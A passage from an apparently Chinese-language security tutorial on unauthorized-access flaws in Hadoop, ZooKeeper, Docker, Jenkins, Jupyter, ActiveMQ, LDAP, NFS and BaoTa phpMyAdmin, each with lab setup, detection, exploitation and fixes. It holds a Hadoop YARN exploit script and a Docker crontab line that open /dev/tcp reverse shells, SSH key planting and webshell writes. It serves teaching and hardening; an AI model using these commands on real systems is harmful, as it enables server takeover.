![1604631926_5fa4bd7607f7c147e203c.png!small?1604631925585](https://image.3001.net/images/20201106/1604631926_5fa4bd7607f7c147e203c.png!small?1604631925585)

4、本地监听8796端口，等待计划任务执行后反弹shell成功

nc -lvvp 8796

![1604631929_5fa4bd79d02a1fa865340.png!small?1604631929353](https://image.3001.net/images/20201106/1604631929_5fa4bd79d02a1fa865340.png!small?1604631929353)

### 修复方法

更改rysnc默认配置文件/etc/rsyncd.conf，添加或修改参数：

访问控制；设置host allow，限制允许访问主机的IP。

权限控制；设置read only，将模块设置成只读。

访问认证；设置auth、secrets，认证成功才能调用服务。

模块隐藏；设置list，将模块隐藏。

## Hadoop未授权访问漏洞

### 漏洞简介

Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web
端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作。

更多Hadoop的介绍请移步：<http://hadoop.apache.org/docs/r3.1.2/>

### 漏洞复现

#### 环境搭建

这里使用vulhub中的项目来搭建复现环境

Vulhub漏洞环境搭建教程参考：

<https://www.fujieace.com/penetration-test/vulhub.html>

![1604631998_5fa4bdbe318e26b63a0be.png!small?1604631997808](https://image.3001.net/images/20201106/1604631998_5fa4bdbe318e26b63a0be.png!small?1604631997808)

#### 漏洞检测

直接访问<http://192.168.168.131:8088/cluster>

![1604632001_5fa4bdc18cde0b97f2afd.png!small?1604632001084](https://image.3001.net/images/20201106/1604632001_5fa4bdc18cde0b97f2afd.png!small?1604632001084)

#### 漏洞利用

利用过程如下：

1、在本地监听等待反弹 shell 连接

2、调用 New Application API 创建 Application

3、调用 Submit Application API 提交

POC: exploit.py

    
    
    #!/usr/bin/env python
     
    import requests
     
    target = 'http://127.0.0.1:8088/'
    lhost = '192.168.220.137' # put your local host ip here, and listen at port 9999
     
    url = target + 'ws/v1/cluster/apps/new-application'
    resp = requests.post(url)
    app_id = resp.json()['application-id']
    url = target + 'ws/v1/cluster/apps'
    data = {
        'application-id': app_id,
        'application-name': 'get-shell',
        'am-container-spec': {
            'commands': {
                'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
            },
        },
        'application-type': 'YARN',
    }
    requests.post(url, json=data)
    

（1）修改py中target、lhost的IP

![1604632041_5fa4bde95aeca4187cb0b.png!small?1604632041063](https://image.3001.net/images/20201106/1604632041_5fa4bde95aeca4187cb0b.png!small?1604632041063)

（2）开启监听nc -lvvp 9999

（3）python exploit.py

![1604632044_5fa4bdec76600432d4b5b.png!small?1604632044067](https://image.3001.net/images/20201106/1604632044_5fa4bdec76600432d4b5b.png!small?1604632044067)

### 修复方法

（1）如无必要，关闭Hadoop Web管理页面

（2）开启身份验证 ,防止未经授权用户访问。

（3）设置“安全组”访问控制策略,将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访包括 50070 以及 WebUI
等相关端口。

## Zookeeper未授权访问漏洞

### 漏洞简介

Zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务，是 Hadoop 和 Hbase
的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括配置维护、域名服务、分布式同步、组服务等。

ZooKeeper 默认开启在 **2181** 端口，在未进行任何访问控制的情况下，攻击者可通过执行 envi
命令获得系统大量的敏感信息，包括系统名称、Java 环境，这将导致任意用户在网络可达的情况下进行未授权访问并读取数据甚至 kill 服务。

### 漏洞复现

#### 环境搭建

    
    
    wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.5.8/apache-zookeeper-3.5.8.tar.gz
    tar -zxvf apache-zookeeper-3.5.8.tar.gz
    cd apache-zookeeper-3.5.8/conf/
    mv zoo_sample.cfg zoo.cfg
    ../bin/zkServer.sh start # 启动

![1604632055_5fa4bdf77b611b5d687d7.png!small?1604632054981](https://image.3001.net/images/20201106/1604632055_5fa4bdf77b611b5d687d7.png!small?1604632054981)

#### 漏洞检测

(1) 通过 nmap 扫描开放了 2181 端口的主机。

(2) 运行脚本通过 socket 连接 2181 端口并发送 envi 命令若服务端返回的数据中包含 ZooKeeper
的服务运行环境信息即可证明存在未授权访问。

Python检测脚本：

    
    
    # coding=utf-8
    import socket
    import sys
     
    def check(ip, port, timeout, cmd):
        try:
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            s.send(cmd)
            data = s.recv(1024)
            s.close()
            print data
        except:
            pass
    
    def main():
        if len(sys.argv) < 3:
            exit()
        ip = sys.argv[1]
        cmd = sys.argv[2]
        # envi
        # dump
        # reqs
        # ruok
        # stat
        check(ip, 2181, 3, cmd)
     
    if __name__ == '__main__':
    main()
    

#### 漏洞利用

1、stat：列出关于性能和连接的客户端的统计信息。

    
    
    echo stat |ncat 127.0.0.1 2181

2、conf：输出相关服务配置的详细信息，端口、数据路径、日志路径、session 超时时间，最大连接数等。

    
    
    echo conf |ncat 127.0.0.1 2181

3、cons：列出所有连接到当前服务器的客户端/会话的详细信息。

    
    
    echo cons |ncat 127.0.0.1 2181

4、envi：打印有关服务环境的详细信息。

    
    
    echo envi |ncat 127.0.0.1 2181

5、dump：列出未完成的会话和临时节点。

    
    
    echo dump |ncat 127.0.0.1 2181

### 修复方法

1、修改 ZooKeeper 默认端口，采用其他端口服务。

2、添加访问控制，配置服务来源地址限制策略。

3、增加 ZooKeeper 的认证配置。

## Docker未授权访问漏洞

### 漏洞简介

Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。Docker
可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux
机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。

存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以脱离容器拿到宿主机权限。

更多docker的介绍请移步：<https://www.runoob.com/docker/docker-tutorial.html>

### 漏洞复现

#### 环境搭建

这里使用vulhub中的项目来搭建复现环境

Vulhub漏洞环境搭建教程参考：

<https://www.fujieace.com/penetration-test/vulhub.html>

![1604632151_5fa4be57052056abd915a.png!small?1604632150498](https://image.3001.net/images/20201106/1604632151_5fa4be57052056abd915a.png!small?1604632150498)

#### 漏洞检测

先用 nmap 扫描查看端口开放情况。2375 为 docker 端口

![1604632154_5fa4be5ab035a23d06283.png!small?1604632154230](https://image.3001.net/images/20201106/1604632154_5fa4be5ab035a23d06283.png!small?1604632154230)

通过命令连接：

docker -H tcp://192.168.168.131:2375 version

![1604632159_5fa4be5fb8d7d7aa11206.png!small?1604632159218](https://image.3001.net/images/20201106/1604632159_5fa4be5fb8d7d7aa11206.png!small?1604632159218)

或者url访问：<http://192.168.168.131:2375/version>

![1604632164_5fa4be6474b2be1cc5d08.png!small?1604632163969](https://image.3001.net/images/20201106/1604632164_5fa4be6474b2be1cc5d08.png!small?1604632163969)

可以看到docker版本等基本信息，说明漏洞存在。

#### 漏洞利用

列出所有镜像

    
    
    docker -H tcp://192.168.168.131:2375 images

列出所有容器

    
    
    docker -H tcp://192.168.168.131:2375 ps -a

##### 1、写入ssh公钥

运行一个新容器，并且将该宿主机的根目录挂在到容器的/mnt目录下

docker -H tcp://192.168.168.131:2375 run -it -v /:/mnt nginx:latest /bin/bash

启动之后就会获得该容器宿主机的shell:

![1604632174_5fa4be6e989cca8036696.png!small?1604632174096](https://image.3001.net/images/20201106/1604632174_5fa4be6e989cca8036696.png!small?1604632174096)

之后将攻击者的ssh公钥~/.ssh/id_rsa.pub的内容写到入宿主机的/root/.ssh/authorized_keys文件中

![1604632194_5fa4be8277ebd1888463f.png!small?1604632193900](https://image.3001.net/images/20201106/1604632194_5fa4be8277ebd1888463f.png!small?1604632193900)

之后就可以用root账户直接登录了

ssh root@x.x.x.x 登录

##### 2、在crontab里写定时任务，反弹shell

1、运行一个新容器，并且将该宿主机的根目录挂在到容器的/mnt目录下:

    
    
    docker -H tcp://192.168.168.131:2375 run -it -v /:/mnt nginx:latest /bin/bash

启动之后就会获得该容器宿主机的shell:

![1604632203_5fa4be8b2190022e16ed1.png!small?1604632202680](https://image.3001.net/images/20201106/1604632203_5fa4be8b2190022e16ed1.png!small?1604632202680)

2、在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/crontabs/root
(ubuntu系统)或/var/spool/cron/root（centos系统）:

    
    
    echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.168.133/8988 0>&1' >> /mnt/var/spool/cron/crontabs/root

![1604632207_5fa4be8f0de37fcc4bb81.png!small?1604632206470](https://image.3001.net/images/20201106/1604632207_5fa4be8f0de37fcc4bb81.png!small?1604632206470)

（写入/etc/crontabs/root文件也可以）

3、本地监听端口，获取shell:

![1604632222_5fa4be9ebf2c37adf680d.png!small?1604632222227](https://image.3001.net/images/20201106/1604632222_5fa4be9ebf2c37adf680d.png!small?1604632222227)

### 修复方法

1、设置ACL，只允许信任ip连接对应端口

2、开启TLS，使用生成的证书进行认证

## Jenkins未授权访问漏洞

### 漏洞简介

Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。Jenkins默认监听端口为8080。

漏洞原因：未设置密码，导致未授权访问。

更多Jenkins的介绍请移步：<https://www.w3cschool.cn/jenkins/>

### 漏洞复现

#### 环境搭建

wget http://mirrors.jenkins.io/debian/jenkins_1.621_all.deb # 下载

dpkg -i jenkins_1.621_all.deb # 安装

service Jenkins start #开启服务

![1604632243_5fa4beb31e7935a89e880.png!small?1604632242536](https://image.3001.net/images/20201106/1604632243_5fa4beb31e7935a89e880.png!small?1604632242536)

![1604632246_5fa4beb691d6581b45f70.png!small?1604632246162](https://image.3001.net/images/20201106/1604632246_5fa4beb691d6581b45f70.png!small?1604632246162)

#### 漏洞检测

直接通过url访问

http://<target>:8080/manage

http://<target>:8080/script

没有任何限制

![1604632252_5fa4bebcc658f772feaed.png!small?1604632252373](https://image.3001.net/images/20201106/1604632252_5fa4bebcc658f772feaed.png!small?1604632252373)

#### 漏洞利用

1、点击script console

![1604632265_5fa4bec9dd1d6b6781b88.png!small?1604632265377](https://image.3001.net/images/20201106/1604632265_5fa4bec9dd1d6b6781b88.png!small?1604632265377)

2、执行系统命令,下图看到成功执行系统命令

![1604632269_5fa4becd8d18fcab719df.png!small?1604632269233](https://image.3001.net/images/20201106/1604632269_5fa4becd8d18fcab719df.png!small?1604632269233)

3、利用Script Console上传webshell,内容如下:

new File("/var/www/html/phpinfo.php").write('<?php phpinfo();?>');

![1604632273_5fa4bed137d1f257e1e1d.png!small?1604632272773](https://image.3001.net/images/20201106/1604632273_5fa4bed137d1f257e1e1d.png!small?1604632272773)![1604632284_5fa4bedcbb3959e1d09d7.png!small?1604632284413](https://image.3001.net/images/20201106/1604632284_5fa4bedcbb3959e1d09d7.png!small?1604632284413)

### 修复方法

1、对后台控制页面做登录验证限制

2、升级版本

## Jupyter Notebook未授权访问漏洞

### 漏洞简介

Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。默认监听在8888端口。

如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。

更多Jupyter Notebook的介绍请移步：

<https://jupyter-notebook.readthedocs.io/en/stable/notebook.html>

### 漏洞复现

#### 环境搭建

这里使用vulhub中的项目来搭建复现环境

Vulhub漏洞环境搭建教程参考：

<https://www.fujieace.com/penetration-test/vulhub.html>

![1604632296_5fa4bee8f3ae0cb56cdd3.png!small?1604632296518](https://image.3001.net/images/20201106/1604632296_5fa4bee8f3ae0cb56cdd3.png!small?1604632296518)

#### 漏洞检测

Nmap扫描开放了8888端口

访问http://IP:8888

![1604632313_5fa4bef916a1a4e418843.png!small?1604632312529](https://image.3001.net/images/20201106/1604632313_5fa4bef916a1a4e418843.png!small?1604632312529)

可直接打开Terminal

#### 漏洞利用

New > Terminal 可以执行任意命令

![1604632318_5fa4befe2a6d6202629ed.png!small?1604632317644](https://image.3001.net/images/20201106/1604632318_5fa4befe2a6d6202629ed.png!small?1604632317644)

### 修复方法

1）配置Jupyter Notebook密码

2）设置访问规则

## ActiveMQ未授权访问漏洞

### 漏洞简介

ActiveMQ是Apache下的开源项目，是一种在分布式系统中应用程序借以传递消息的媒介，ActiveMQ默认监听在8161端口。

默认情况下，ActiveMQ服务是没有配置安全参数。攻击者可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。ActiveMQ默认账号密码为admin/admin

### 漏洞复现

#### 环境搭建

这里使用vulhub中的项目(CVE-2015-5254)来搭建复现环境

Vulhub漏洞环境搭建教程参考：

<https://www.fujieace.com/penetration-test/vulhub.html>

![1604632326_5fa4bf06cd452750c985e.png!small?1604632326357](https://image.3001.net/images/20201106/1604632326_5fa4bf06cd452750c985e.png!small?1604632326357)

#### 漏洞检测

nmap扫描，开放了8161端口

访问url: <http://192.168.168.131:8161>

登录，默认用户名密码是 admin/admin

![1604632331_5fa4bf0b271794fb7eb3a.png!small?1604632330561](https://image.3001.net/images/20201106/1604632331_5fa4bf0b271794fb7eb3a.png!small?1604632330561)

#### 漏洞利用

若服务器存在fileserver目录，则可以通过put请求写入文件，但fileserver下的文件默认不解析

![1604632335_5fa4bf0fa31d7b9e05337.png!small?1604632335243](https://image.3001.net/images/20201106/1604632335_5fa4bf0fa31d7b9e05337.png!small?1604632335243)

然后使用MOVE请求移动文件，如果是写入webshell需要做的物理路径，在<http://192.168.168.131:8161/admin/test/systemProperties.jsp>可以查看物理路径

![1604632339_5fa4bf13190c41a27744f.png!small?1604632338546](https://image.3001.net/images/20201106/1604632339_5fa4bf13190c41a27744f.png!small?1604632338546)![1604632342_5fa4bf1656847ca0c72b3.png!small?1604632341758](https://image.3001.net/images/20201106/1604632342_5fa4bf1656847ca0c72b3.png!small?1604632341758)![1604632344_5fa4bf18e97c979c23242.png!small?1604632344411](https://image.3001.net/images/20201106/1604632344_5fa4bf18e97c979c23242.png!small?1604632344411)

如果是root权限，还可以直接写入cron或ssh key等文件，反弹shell。

### 修复方法

1）针对未授权访问，可修改conf/jetty.xml文件，bean
id为securityConstraint下的authenticate修改值为true，重启服务即可

2）针对弱口令，可修改conf/jetty.xml文件，bean id
为securityLoginService下的conf值获取用户properties，修改用户名密码，重启服务即可

## LDAP未授权访问漏洞

### 漏洞简介

LDAP中文全称为：轻型目录访问协议（Lightweight Directory Access Protocol），默认使用389端口， LDAP
底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。

未对LDAP的访问进行密码验证，导致未授权访问。

### 漏洞复现

#### 漏洞检测

Python检测脚本

    
    
    #! /usr/bin/env python
    # _*_  coding:utf-8 _*_
    from ldap3 import Connection,Server,ALL
    def ldap_anonymous(ip):
        try:
            server = Server(ip,get_info=ALL,connect_timeout=1)
            conn = Connection(server, auto_bind=True)
            print "[+] ldap login for anonymous"
            conn.closed
        except:
            #pass
            print '[-] checking for ldap anonymous fail'
    

#### 漏洞利用

可以使用ldapbrowser直接连接，获取目录内容。

![1604632387_5fa4bf4312257eb88f3b0.png!small?1604632386702](https://image.3001.net/images/20201106/1604632387_5fa4bf4312257eb88f3b0.png!small?1604632386702)

点击File->New Profile，把要连接的ldap server的IP、端口、base
DN、用户名、密码统统填好，然后就能连上了，一般是能看到整个ldap树的情况。

### 修复方法

1）修改ldap的acl，不允许匿名访问。

2）根据业务设置ldap访问白名单或黑名单。

## NSF未授权访问漏洞

### 漏洞简介

NFS（Network File
System）即网络文件系统，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。若运维人员未对文件访问进行控制，将导致本地文件可被任意读取。

NFS默认监听端口为2049。

### 漏洞复现

#### 环境搭建

安装NFS服务端： sudo apt install nfs-kernel-serve

安装NFS客户端： sudo apt install nfs-common

编写配置文件：

#编辑/etc/exports 文件：

    
    
    sudo vi /etc/exports

#/etc/exports文件的内容如下：

    
    
    /tmp *(rw,sync,no_subtree_check,no_root_squash)

创建共享目录

#在服务器端创建/tmp共享目录

    
    
    sudo mkdir -p /tmp

重启nfs服务：

    
    
    sudo service nfs-kernel-server restart

![1604632400_5fa4bf509ae16f471de5e.png!small?1604632400122](https://image.3001.net/images/20201106/1604632400_5fa4bf509ae16f471de5e.png!small?1604632400122)

#### 漏洞利用

showmount -e 192.168.168.131 查看nfs服务器上的共享目录

![1604632440_5fa4bf7886e9c98ffc7c2.png!small?1604632440027](https://image.3001.net/images/20201106/1604632440_5fa4bf7886e9c98ffc7c2.png!small?1604632440027)

将NFS服务器192.168.168.131上的目录，挂载到本地

sudo mount -t nfs 192.168.168.131:/tmp /mnt

![1604632450_5fa4bf82a33c702aaddc9.png!small?1604632450099](https://image.3001.net/images/20201106/1604632450_5fa4bf82a33c702aaddc9.png!small?1604632450099)

### 修复方法

1、设置/etc/exports，对访问进行控制

2、利用iptables限制端口2049和20048端口的访问

## 宝塔面板phpMyAdmin未授权访问漏洞

### 漏洞简介

宝塔面板是提升运维效率的服务器管理软件，支持一键LAMP/LNMP/WAMP/集群/监控/网站/FTP/数据库/JAVA等100多项服务器管理功能。

宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞。

### 漏洞复现

漏洞 URL：ip:888/pma 即可直接登录（但要求必须安装了 phpmyadmin）

![1604632459_5fa4bf8b5e965106ccebd.png!small?1604632459361](https://image.3001.net/images/20201106/1604632459_5fa4bf8b5e965106ccebd.png!small?1604632459361)

### 修复方法

  * 更新到最新版
  * 进入目录 /www/server/phpmyadmin/ 里面 把 PMA 目录删掉

## 参考

<https://www.freebuf.com/articles/web/207877.html>

<https://xz.aliyun.com/t/6103>

<https://www.cnblogs.com/xiaozi/p/13369596.html>

<https://www.yuque.com/cheng-4ueio/tow7i5/wrbzgy>

  

